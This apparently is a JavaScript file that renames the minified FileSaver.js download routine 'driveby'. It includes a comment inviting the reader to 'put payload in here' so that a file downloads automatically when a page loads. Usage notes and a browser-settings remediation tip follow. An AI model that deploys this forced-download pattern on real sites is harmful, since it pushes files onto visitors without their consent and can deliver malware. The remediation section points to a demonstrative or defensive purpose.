const driveby=function(){function e(e,t,n){var o=new XMLHttpRequest;o.open("GET",e),o.responseType="blob",o.onload=function(){i(o.response,t,n)},o.onerror=function(){console.error("could not download file")},o.send()}function t(e){var t=new XMLHttpRequest;t.open("HEAD",e,!1);try{t.send()}catch(e){}return 200<=t.status&&299>=t.status}function n(e){try{e.dispatchEvent(new MouseEvent("click"))}catch(n){var t=document.createEvent("MouseEvents");t.initMouseEvent("click",!0,!0,window,0,0,0,80,20,!1,!1,!1,!1,0,null),e.dispatchEvent(t)}}var o="object"==typeof window&&window.window===window?window:"object"==typeof self&&self.self===self?self:"object"==typeof global&&global.global===global?global:void 0,a=/Macintosh/.test(navigator.userAgent)&&/AppleWebKit/.test(navigator.userAgent)&&!/Safari/.test(navigator.userAgent),i=o.saveAs||("object"!=typeof window||window!==o?function(){}:"download"in HTMLAnchorElement.prototype&&!a?function(a,i,r){var l=o.URL||o.webkitURL,c=document.createElement("a");i=i||a.name||"download",c.download=i,c.rel="noopener","string"==typeof a?(c.href=a,c.origin===location.origin?n(c):t(c.href)?e(a,i,r):n(c,c.target="_blank")):(c.href=l.createObjectURL(a),setTimeout((function(){l.revokeObjectURL(c.href)}),4e4),setTimeout((function(){n(c)}),0))}:"msSaveOrOpenBlob"in navigator?function(o,a,i){if(a=a||o.name||"download","string"!=typeof o)navigator.msSaveOrOpenBlob(b(o,i),a);else if(t(o))e(o,a,i);else{var r=document.createElement("a");r.href=o,r.target="_blank",setTimeout((function(){n(r)}))}}:function(t,n,i,r){if((r=r||open("","_blank"))&&(r.document.title=r.document.body.innerText="downloading..."),"string"==typeof t)return e(t,n,i);var l="application/octet-stream"===t.type,c=/constructor/i.test(o.HTMLElement)||o.safari,s=/CriOS\/[\d]+/.test(navigator.userAgent);if((s||l&&c||a)&&"undefined"!=typeof FileReader){var u=new FileReader;u.onloadend=function(){var e=u.result;e=s?e:e.replace(/^data:[^;]*;/,"data:attachment/file;"),r?r.location.href=e:location=e,r=null},u.readAsDataURL(t)}else{var d=o.URL||o.webkitURL,f=d.createObjectURL(t);r?r.location=f:location.href=f,r=null,setTimeout((function(){d.revokeObjectURL(f)}),4e4)}});
/** remove it or put payload in here
  i("https://example.com/image", "image.jpg");
  
  const blob = new Blob(["Hello, world!"], {type: "text/plain;charset=utf-8"});
  i(blob, "hello world.txt");
**/				 
return i}();

// Examples
/**
# Usage

### Saving File

You can save a File constructor without specifying a filename. If the file itself already contains a name, there is a hand full of ways to get a file instance (from storage, file input, new constructor, clipboard event). If you still want to change the name, then you can change it in the 2nd argument.

```js
var file = new File(["Hello, world!"], "hello world.txt", {type: "text/plain;charset=utf-8"});

driveby(file);
```

Note: IE and Edge don't support the new File constructor, so it's better to construct blobs and use `driveby(blob, filename)`

```javascript
var blob = new Blob(["Hello, world!"], {type: "text/plain;charset=utf-8"});

driveby(blob, "hello world.txt");
```
### Saving from URLs or redirecting

Saving from URL's can also redirect to file under certain conditions.
For more redirections - [[Force redirection]]

```javascript
driveby("https://httpbin.org/image", "image.jpg");
```
### Saving canvas

```javascript
var canvas = document.getElementById("my-canvas");
canvas.toBlob(function(blob) {
    driveby(blob, "pretty image.png");
});
```

# Remediation 

Set your browser settings to (chrome >> settings >> advanced >> downloads and turn on _'Ask where to save each file before downloading'_.
**/